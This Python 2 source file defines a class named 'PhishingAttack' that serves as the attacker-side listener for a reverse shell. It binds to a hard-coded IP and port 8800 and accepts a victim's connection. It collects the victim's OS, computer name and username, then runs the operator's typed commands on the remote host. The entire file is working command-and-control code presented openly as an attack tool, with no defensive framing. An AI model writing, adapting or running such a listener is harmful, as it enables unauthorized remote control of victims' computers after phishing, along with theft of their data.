#coding=utf-8
import socket,subprocess as sp
import sys
import os
import platform
# 控制台函数
class PhishingAttack:  
    def console(self,connection, address):
        print "[+]Connection Established from %s \n" % (address)
        sysinfo = connection.recv(2048).split(",")
        x_info = ''
        x_info +="Operating System: "+"%s\n" % (sysinfo[0])
        x_info +="Computer Name: "+"%s\n" % (sysinfo[1])
        x_info += "Username: "+ "%s\n" % (sysinfo[5])
        x_info += "Release Version: "+ "%s\n" % (sysinfo[2])
        x_info += "System Version: "+ "%s\n" % (sysinfo[3])
        x_info += "Machine Architecture: " + "%s" % (sysinfo[4])
        if sysinfo[0] == "Linux":
            user = sysinfo[6] + "@" + address
        elif sysinfo[0] == "Windows":
            user = sysinfo[7] + "@" + address
        else:
            user = "Unknown@" + address
        while 1:
            command = raw_input(" " + "%s" % (user)+ " " +">"+ " ").strip()
            if command == "":
                continue
            elif command == "cls":
                if sysinfo[0] == "Linux":
                    dp = os.system("clear")
                elif sysinfo[0] == "Windows":
                    dp = os.system("cls")
            elif command == "help":
                print self.help()
            elif command == "sysinfo":
                if sysinfo[0] == "Linux":
                    print "Operating System: " + "%s" % (sysinfo[0])
                    print "Computer Name: "+ "%s" % (sysinfo[1])
                    print  "Username: "+ "%s" % (sysinfo[6])
                    print "Release Version: "+ "%s" % (sysinfo[2])
                    print "System Version: "+ "%s" % ( sysinfo[3])
                    print "Machine Architecture: "+ "%s" % ( sysinfo[4])
                elif sysinfo[0] == "Windows":
                    print "Operating System: " + "%s" % (sysinfo[0])
                    print "Computer Name: "+ "%s" % (sysinfo[1])
                    print  "Username: "+ "%s" % (sysinfo[7])
                    print "Release Version: "+ "%s" % (sysinfo[2])
                    print "System Version: "+ "%s" % ( sysinfo[3])
                    print "Machine Architecture: "+ "%s" % ( sysinfo[4])
    
            elif command == "exit()":
                connection.send("exit()")
                print " [+] " + "Shell Going Down"
                break
            elif command =="exit":
                print "Attack completed!"
                #connection.shutdown()
                connection.close()
                os.system('python start.py') 
                
            else:
                try:
                        if len(command.split(" ")) == 0:
                            print "\n [!] " + "Command: exec <command>"
                            print "\n Execute Argument As Command On Remote Host\n"
                            continue
                        res = 0
                        msg = " "
                        while len(command.split(" ")) > res:
                            msg += command.split(" ")[res] + " "
                            res += 1
                        response = self.send_data(connection, msg)
                        if response.split("\n")[-1].strip() != "":
                            response += "\n"
                        if response.split("\n")[0].strip()!="":
                            response = "\n" + response
                        for x in response.split("\n"):
                            print " " + x                    
                except socket.error:
                    print "[-] Unknown Command"

# 帮助函数
    def help(self):
        help_list = {}
        help_list["sysinfo"] = "Display Remote System Information "
        help_list["exec"] = "Execute A Command On Remote Host "
        help_list["cls"] = "Clear The Terminal "
        help_list["help"] = "Prints this help message "
        help_list["exit"]="Exit "
        return_str = "\n Command "+ " . "
        return_str +=  " Descriptionn %s \n" % ("-" * 50)
        for x in sorted(help_list):
            dec = help_list[x]
            return_str += " " +  x + " - " +  dec + "\n"
        return return_str.rstrip("\n")
    
    # 发送数据
    def send_data(self,connection,data):
        try:
            connection.send(data)
        except socket.error as e:
            print "[ - ]"+ "Unable To Send Data"
            return
    
        result = connection.recv(2048)
        total_size = long(result[:16])
        result = result[16:]
    
        while total_size > len(result):
            data = connection.recv(2048)
            result += data
    
        return  result.rstrip("\n")
    
    # 主控制函数
    def attack(self):
        try:
            host = "192.168.43.202"#得到本地ip         
            port = 8800
        except Exception as e:
            print script_colors("red","[-]") + "Socket Information Not Provided"
            sys.exit(1)
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字
        s.bind((host,port))
        s.listen(5)
        print  "[+]Listening on %s:%d ..." % (host, port)
        try:
            clientsocket,addr = s.accept()
        except KeyboardInterrupt:
            print "[-] User Request An Interrupt"
            sys.exit(0)
        self.console( clientsocket,str(addr[0]))
        s.close() # 关闭套接字


